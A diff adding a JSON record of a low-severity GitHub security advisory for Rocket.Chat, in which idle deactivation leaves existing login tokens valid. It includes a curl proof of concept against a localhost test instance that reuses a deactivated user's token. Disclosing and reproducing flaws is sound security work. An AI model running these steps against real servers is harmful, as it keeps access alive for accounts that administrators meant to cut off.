@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-6g3w-vg5p-w892",
+  "repo": {
+    "cve_id": "CVE-2026-45757",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "  ### Summary\r\n  Rocket.Chat 8.2.0 allows users deactivated through `users.deactivateIdle` to keep using already-issued login tokens. A user that an administrator has marked inactive for idleness can still access authenticated REST endpoints with the old token.\r\n\r\n  ### Details\r\n  The `users.deactivateIdle` route in `apps/meteor/app/api/server/v1/users.ts:421-436` calls `Users.setActiveNotLoggedInAfterWithRole(...)`.\r\n\r\n  That model method in `packages/models/src/models/Users.ts:2946-2964` only updates `active` and `inactiveReason`. It does not revoke `services.resume.loginTokens`.\r\n\r\n  By contrast, the normal deactivation path in `apps/meteor/app/lib/server/functions/setUserActiveStatus.ts:122-126` explicitly calls `Users.unsetLoginTokens(userId)` when a user is deactivated.\r\n\r\n  Because REST authentication only checks `_id + services.resume.loginTokens.hashedToken` and does not require `active: true`:\r\n\r\n  - `apps/meteor/app/api/server/ApiClass.ts:978`\r\n  - `packages/models/src/models/Users.ts:2402`\r\n\r\n  an already-issued token keeps working after idle deactivation.\r\n\r\n  ### PoC\r\n  1. Log in as the victim and save the token:\r\n     ```bash\r\n     VICTIM=$(curl -s -X POST http://localhost:3000/api/v1/login \\\r\n       -H 'Content-Type: application/json' \\\r\n       -d '{\"user\":\"victim\",\"password\":\"victimpass\"}')\r\n     VICTIM_TOKEN=$(jq -r '.data.authToken' <<<\"$VICTIM\")\r\n     VICTIM_ID=$(jq -r '.data.userId' <<<\"$VICTIM\")\r\n\r\n  2. In a test instance, isolate the victim to the guest role:\r\n     ```bash\r\n       curl -s -X POST http://localhost:3000/api/v1/roles.addUserToRole \\\r\n       -H \"X-Auth-Token: $ADMIN_TOKEN\" \\\r\n       -H \"X-User-Id: $ADMIN_ID\" \\\r\n       -H 'Content-Type: application/json' \\\r\n       -d '{\"roleId\":\"guest\",\"userId\":\"'\"$VICTIM_ID\"'\"}'\r\n\r\n  3. Deactivate idle users for that role:\r\n     ```bash\r\n     curl -s -X POST http://localhost:3000/api/v1/users.deactivateIdle \\\r\n       -H \"X-Auth-Token: $ADMIN_TOKEN\" \\\r\n       -H \"X-User-Id: $ADMIN_ID\" \\\r\n       -H 'Content-Type: application/json' \\\r\n       -d '{\"daysIdle\":0,\"role\":\"guest\"}'\r\n\r\n  4. Reuse the victim's old token:\r\n      ```bash\r\n       curl -s http://localhost:3000/api/v1/me \\\r\n       -H \"X-Auth-Token: $VICTIM_TOKEN\" \\\r\n       -H \"X-User-Id: $VICTIM_ID\"\r\n\r\n  5. The request still succeeds even though the account was deactivated by users.deactivateIdle.\r\n\r\n  ### Impact\r\n\r\n  This is a session-revocation flaw in the community server. Administrative idle deactivation does not actually terminate existing authenticated sessions, so deactivated users retain API access until tokens are separately removed.",
+    "ghsa_id": "GHSA-6g3w-vg5p-w892",
+    "html_url": "https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-6g3w-vg5p-w892",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6g3w-vg5p-w892"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45757"
+      }
+    ],
+    "published_at": "2026-05-25T11:32:10Z",
+    "references": [],
+    "severity": "low",
+    "summary": "users.deactivateIdle deactivates accounts without revoking existing login tokens",
+    "updated_at": "2026-05-25T11:32:10Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@rocket.chat/meteor"
+        },
+        "patched_versions": "8.5.0, 8.4.2, 8.3.4, 8.2.4, 8.1.5, 8.0.6, 7.13.8, 7.10.12",
+        "vulnerable_version_range": "<8.4.2, <8.3.4, <8.2.4, <8.1.5, <8.0.6, <7.13.8, <7.10.12"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "RocketChat/Rocket.Chat"
+}
